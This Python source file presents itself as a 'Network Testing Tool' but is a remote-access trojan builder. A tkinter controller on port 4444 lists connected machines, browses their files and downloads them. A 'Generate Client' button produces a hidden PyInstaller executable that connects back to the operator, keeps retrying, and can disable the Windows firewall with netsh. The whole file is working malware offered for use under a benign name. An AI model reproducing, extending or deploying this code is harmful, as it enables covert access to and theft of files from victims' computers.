import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import subprocess
import os
import json
import shutil
import platform

class NetworkTesterGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Network Testing Tool")
        self.root.geometry("800x800")
        
        # Create main sections
        self.create_connection_frame()
        self.create_file_browser_frame()
        
        self.is_listening = False
        self.connections = []
        self.current_connection = None
        self.current_path = "/"


    def create_connection_frame(self):
        # Connection frame
        conn_frame = ttk.LabelFrame(self.root, text="Connection Settings")
        conn_frame.pack(fill="x", padx=5, pady=5)

        # ASCII Art Logo
        ascii_logo = r"""
                                    _____                                     
  _____  ______  _____  _____   __|___  |__  __   _  ______  ____    ____    
 |_    ||___   ||_    ||_    | |   ___|    ||  |_| ||   ___||    |  |    |   
  |    ||___   | |    | |    |  `-.`-.     ||   _  ||   ___||    |_ |    |_  
  |____||______| |____| |____| |______|  __||__| |_||______||______||______| 
                                  |_____|                                    
                                                                             
        """
        logo_label = tk.Label(conn_frame, text=ascii_logo, font=("Courier", 10), justify="left")
        logo_label.pack(pady=5)
        
        # Server status
        self.status_label = tk.Label(conn_frame, text="Status: Not Listening", fg="red")
        self.status_label.pack(pady=5)
        
        # IP input
        ip_frame = tk.Frame(conn_frame)
        ip_frame.pack(pady=5)
        tk.Label(ip_frame, text="IP Address:").pack(side=tk.LEFT)
        self.ip_entry = tk.Entry(ip_frame)
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.pack(side=tk.LEFT, padx=5)
        
        # Port input
        port_frame = tk.Frame(conn_frame)
        port_frame.pack(pady=5)
        tk.Label(port_frame, text="Port:").pack(side=tk.LEFT)
        self.port_entry = tk.Entry(port_frame)
        self.port_entry.insert(0, "4444")
        self.port_entry.pack(side=tk.LEFT, padx=5)
        
        # Disable Firewall checkbox
        self.disable_firewall_var = tk.BooleanVar()
        self.disable_firewall_checkbox = tk.Checkbutton(
            conn_frame, text="Disable Firewall (requires admin privilages to affect)", variable=self.disable_firewall_var
        )
        self.disable_firewall_checkbox.pack(pady=5)

        # Buttons
        button_frame = tk.Frame(conn_frame)
        button_frame.pack(pady=5)
        self.listen_button = tk.Button(button_frame, text="Start Listening", command=self.toggle_listen)
        self.listen_button.pack(side=tk.LEFT, padx=5)
        
        self.generate_button = tk.Button(button_frame, text="Generate Client", command=self.generate_client)
        self.generate_button.pack(side=tk.LEFT, padx=5)
        
        # Connection list
        tk.Label(conn_frame, text="Connected Clients:").pack(pady=5)
        self.conn_listbox = tk.Listbox(conn_frame, height=3)
        self.conn_listbox.pack(pady=5, fill="x", padx=5)
        self.conn_listbox.bind('<<ListboxSelect>>', self.on_connection_select)

    def create_file_browser_frame(self):
        # File browser frame
        file_frame = ttk.LabelFrame(self.root, text="File Browser")
        file_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Path navigation
        nav_frame = tk.Frame(file_frame)
        nav_frame.pack(fill="x", pady=5)
        
        self.path_var = tk.StringVar(value="/")
        self.path_entry = tk.Entry(nav_frame, textvariable=self.path_var)
        self.path_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        
        self.refresh_button = tk.Button(nav_frame, text="Refresh", command=self.refresh_files)
        self.refresh_button.pack(side=tk.RIGHT, padx=5)
        
        # Download button
        self.download_button = tk.Button(nav_frame, text="Download Selected", command=self.download_selected)
        self.download_button.pack(side=tk.RIGHT, padx=5)
        
        # File listbox with scrollbar
        self.file_tree = ttk.Treeview(file_frame, columns=("type", "size"), show="tree headings")
        self.file_tree.heading("type", text="Type")
        self.file_tree.heading("size", text="Size")
        
        scrollbar = ttk.Scrollbar(file_frame, orient="vertical", command=self.file_tree.yview)
        self.file_tree.configure(yscrollcommand=scrollbar.set)
        
        self.file_tree.pack(side=tk.LEFT, fill="both", expand=True)
        scrollbar.pack(side=tk.RIGHT, fill="y")
        
        self.file_tree.bind("<Double-1>", self.on_item_double_click)

    def toggle_listen(self):
        if not self.is_listening:
            try:
                ip = self.ip_entry.get()
                port = int(self.port_entry.get())
                
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind((ip, port))
                self.server_socket.listen(5)
                
                self.is_listening = True
                self.status_label.config(text="Status: Listening", fg="green")
                self.listen_button.config(text="Stop Listening")
                
                self.listen_thread = threading.Thread(target=self.accept_connections)
                self.listen_thread.daemon = True
                self.listen_thread.start()
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to start listening: {str(e)}")
        else:
            self.stop_listening()
    
    def stop_listening(self):
        self.is_listening = False
        self.server_socket.close()
        self.status_label.config(text="Status: Not Listening", fg="red")
        self.listen_button.config(text="Start Listening")
        self.conn_listbox.delete(0, tk.END)
        
        for conn in self.connections:
            try:
                conn.close()
            except:
                pass
        self.connections.clear()

    def accept_connections(self):
        while self.is_listening:
            try:
                conn, addr = self.server_socket.accept()
                # Get OS information immediately after connection
                command = {
                    "command": "get_os_info"
                }
                conn.send(json.dumps(command).encode())
                os_info = conn.recv(1024).decode()
                
                self.connections.append((conn, addr))
                self.conn_listbox.insert(tk.END, f"{addr[0]}:{addr[1]} ({os_info})")
            except:
                break

    def on_connection_select(self, event):
        selection = self.conn_listbox.curselection()
        if selection:
            self.current_connection = self.connections[selection[0]]
            self.refresh_files()

    def refresh_files(self):
        if not self.current_connection:
            return
            
        try:
            conn = self.current_connection[0]
            # Send command to list files
            command = {
                "command": "list_files",
                "path": self.path_var.get()
            }
            conn.send(json.dumps(command).encode())
            
            # Receive response
            response = conn.recv(8192).decode()
            files = json.loads(response)
            
            # Clear current items
            for item in self.file_tree.get_children():
                self.file_tree.delete(item)
            
            # Add new items
            for file_info in files:
                icon = "📁" if file_info["is_dir"] else "📄"
                self.file_tree.insert("", "end", text=f"{icon} {file_info['name']}", 
                                    values=(file_info["type"], 
                                           file_info["size"] if not file_info["is_dir"] else ""))
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to list files: {str(e)}")

    def on_item_double_click(self, event):
        item = self.file_tree.selection()[0]
        item_text = self.file_tree.item(item)["text"]
        
        if item_text.startswith("📁"):  # It's a directory
            new_path = os.path.join(self.path_var.get(), item_text[2:]).replace("\\", "/")
            self.path_var.set(new_path)
            self.refresh_files()

    def download_selected(self):
        if not self.current_connection:
            messagebox.showerror("Error", "No connection selected")
            return
            
        selected_items = self.file_tree.selection()
        if not selected_items:
            messagebox.showerror("Error", "No file selected")
            return
            
        # Get the download directory from user
        download_dir = filedialog.askdirectory(title="Select Download Directory")
        if not download_dir:
            return
            
        for item in selected_items:
            item_text = self.file_tree.item(item)["text"]
            if item_text.startswith("📁"):  # Skip directories
                continue
                
            filename = item_text[2:]  # Remove icon
            filepath = os.path.join(self.path_var.get(), filename).replace("\\", "/")
            
            try:
                conn = self.current_connection[0]
                command = {
                    "command": "download_file",
                    "path": filepath
                }
                conn.send(json.dumps(command).encode())
                
                # Receive file size
                size_data = conn.recv(1024).decode()
                file_size = int(size_data)
                conn.send(b"ready")
                
                # Receive and save file
                with open(os.path.join(download_dir, filename), "wb") as f:
                    received_size = 0
                    while received_size < file_size:
                        chunk = conn.recv(8192)
                        if not chunk:
                            break
                        f.write(chunk)
                        received_size += len(chunk)
                
                messagebox.showinfo("Success", f"Downloaded {filename} successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to download {filename}: {str(e)}")

    def generate_client(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()

        client_code = '''
import socket
import json
import os
import time
import platform

def disable_firewall():
    if platform.system() == "Windows":
        import subprocess
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], check=True)

def get_file_info(path):
    try:
        entries = []
        with os.scandir(path) as it:
            for entry in it:
                try:
                    info = {
                        "name": entry.name,
                        "is_dir": entry.is_dir(),
                        "type": "Directory" if entry.is_dir() else "File",
                        "size": os.path.getsize(entry.path) if not entry.is_dir() else ""
                    }
                    entries.append(info)
                except Exception:
                    continue
        return entries
    except Exception as e:
        return []

def get_os_info():
    return f"{platform.system()} {platform.release()}"

def handle_command(command, sock):
    if command["command"] == "list_files":
        path = command["path"]
        return json.dumps(get_file_info(path))
    elif command["command"] == "get_os_info":
        return get_os_info()
    elif command["command"] == "download_file":
        try:
            path = command["path"]
            file_size = os.path.getsize(path)
            sock.send(str(file_size).encode())
            sock.recv(1024)  # Wait for ready signal
            
            with open(path, "rb") as f:
                while True:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    sock.send(chunk)
            return ""
        except Exception as e:
            return json.dumps({"error": f"Download failed: {str(e)}"})
    return json.dumps({"error": "Unknown command"})

def connect():
    ''' + ('disable_firewall()' if self.disable_firewall_var.get() else '') + '''
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("''' + ip + '''", ''' + port + '''))
            while True:
                try:
                    data = s.recv(1024).decode()
                    if not data:
                        break

                    command = json.loads(data)
                    response = handle_command(command, s)
                    if response:  # Only send if there's a response (download doesn't need one)
                        s.send(response.encode())
                except Exception as e:
                    break

        except Exception:
            time.sleep(5)
            continue

if __name__ == "__main__":
    connect()
'''

        # Save the client code to a file
        with open("network_client.py", "w") as f:
            f.write(client_code)

        try:
            # Generate the executable using PyInstaller
            subprocess.run(["python", "-m", "PyInstaller", "--onefile", "--noconsole", "network_client.py"], check=True)

            # Move the executable to the current directory and clean up
            shutil.move("dist/network_client.exe", os.getcwd())
            shutil.rmtree("build")
            shutil.rmtree("dist")
            os.remove("network_client.spec")
            os.remove("network_client.py")

            messagebox.showinfo("Success", "Client executable generated successfully!")

        except subprocess.CalledProcessError as e:
            messagebox.showerror("Error", f"Failed to generate client: {e.output.decode()}\n{str(e)}")
        except Exception as e:
            messagebox.showerror("Error", f"An unexpected error occurred: {str(e)}")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = NetworkTesterGUI()
    app.run()